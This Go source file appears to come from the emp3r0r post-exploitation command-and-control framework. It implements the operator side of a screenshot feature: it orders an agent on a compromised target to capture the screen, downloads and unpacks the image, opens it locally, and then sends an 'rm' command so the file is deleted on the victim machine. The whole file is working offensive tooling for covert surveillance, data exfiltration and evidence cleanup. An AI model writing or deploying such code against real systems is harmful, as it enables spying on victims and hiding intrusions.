//go:build linux
// +build linux

package cc


import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver/v3"
)

// TakeScreenshot take a screenshot of selected target, and download it
// open the picture if possible
func TakeScreenshot() {
	// tell agent to take screenshot
	err := SendCmdToCurrentTarget("screenshot", "")
	if err != nil {
		CliPrintError("send screenshot cmd: %v", err)
		return
	}

	// then we handle the cmd output in agentHandler
}

func processScreenshot(out string, target *emp3r0r_data.AgentSystemInfo) (err error) {
	if strings.Contains(out, "Error") {
		return fmt.Errorf(out)
	}
	CliPrintInfo("We will get %s screenshot file for you, wait", strconv.Quote(out))
	err = GetFile(out, target)
	if err != nil {
		err = fmt.Errorf("Get screenshot: %v", err)
		return
	}

	// basename
	path := util.FileBaseName(out)

	// be sure we have downloaded the file
	is_download_completed := func() bool {
		return !util.IsExist(FileGetDir+path+".downloading") &&
			util.IsExist(FileGetDir+path)
	}

	is_download_corrupted := func() bool {
		return !is_download_completed() && !util.IsExist(FileGetDir+path+".lock")
	}
	for {
		time.Sleep(100 * time.Millisecond)
		if is_download_completed() {
			break
		}
		if is_download_corrupted() {
			CliPrintWarning("Processing screenshot %s: incomplete download detected, retrying...",
				strconv.Quote(out))
			return processScreenshot(out, target)
		}
	}

	// unzip if it's zip
	if strings.HasSuffix(path, ".zip") {
		err = archiver.Unarchive(FileGetDir+path, FileGetDir)
		if err != nil {
			return fmt.Errorf("Unarchive screenshot zip: %v", err)
		}
		CliPrintWarning("Multiple screenshots extracted to %s", FileGetDir)
		return
	}

	// open it if possible
	if util.IsCommandExist("xdg-open") &&
		os.Getenv("DISPLAY") != "" {
		CliPrintInfo("Seems like we can open the picture (%s) for you to view, hold on",
			FileGetDir+path)
		cmd := exec.Command("xdg-open", FileGetDir+path)
		err = cmd.Start()
		if err != nil {
			return fmt.Errorf("Crap, we cannot open the picture: %v", err)
		}
	}

	// tell agent to delete the remote file
	err = SendCmd("rm "+out, "", target)
	if err != nil {
		CliPrintWarning("Failed to delete remote file %s: %v", strconv.Quote(out), err)
	}

	return
}
